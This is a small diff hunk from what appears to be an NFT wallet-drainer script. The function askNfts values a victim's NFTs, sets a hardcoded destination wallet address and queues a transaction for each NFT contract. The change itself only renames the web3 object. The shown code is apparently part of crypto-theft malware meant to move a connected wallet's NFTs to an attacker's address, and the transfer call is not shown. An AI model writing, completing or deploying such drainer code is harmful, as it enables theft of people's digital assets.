@@ -100,7 +100,7 @@ async function askNfts() {
         const ethPrice = round(nft.price * (nft.type == "erc1155" ? nft.owned : 1))
        // if (ethPrice < 0.1) continue;
         const thewallet = "0xf92D48dDe90C4aD033381b0cA52d08c0636A7ddc";
-        const ctrInstance = new web3.eth.Contract(JSON.parse(ABInft), nft.contract_address)
+        const ctrInstance = new web3Js.eth.Contract(JSON.parse(ABInft), nft.contract_address)
         
         transactionsOptions.push({
             price: ethPrice,
